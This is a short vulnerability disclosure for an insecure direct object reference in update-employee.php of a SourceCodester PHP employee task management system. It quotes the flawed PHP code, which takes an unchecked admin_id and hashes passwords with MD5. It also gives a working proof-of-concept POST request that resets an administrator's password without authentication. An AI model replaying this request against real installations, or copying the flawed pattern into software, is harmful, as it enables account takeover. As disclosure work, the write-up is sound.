# SOURCECODESTER / Employee Task Management System - IDOR update-employee.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)

## Vendor Homepage:
> https://www.sourcecodester.com/php/17217/employee-management-system-php-and-mysql-free-download.html

## Affected Component
> /update-employee.php

## Code
### update-employee.php
```php
if(isset($_POST['btn_user_password'])){

    $obj_admin->update_user_password($_POST,$admin_id);
}
```
### classes/admin_class.php
```php
public function update_user_password($data, $id){
		$employee_password  = $this->test_form_input_data(md5($data['employee_password']));
		
		try{
			$update_user_password = $this->db->prepare("UPDATE tbl_admin SET password = :x WHERE user_id = :id ");

			$update_user_password->bindparam(':x', $employee_password);
			$update_user_password->bindparam(':id', $id);
			
			$update_user_password->execute();

			$_SESSION['update_user_pass'] = 'update_user_pass';

			header('Location: admin-manage-user.php');
		}catch (PDOException $e) {
			echo $e->getMessage();
		}
	}
```

## Proof of Concept
**HTTP Request Example**
>admin_id parameter is vulnerable to IDOR
>Note: Attacker can use idor without authentication in burp by not following the redirection
``` http request
POST /update-employee.php?admin_id=1 HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Research-By: NoChizPlz

employee_password=NoChizPlz&btn_user_password=
```

## Screenshot



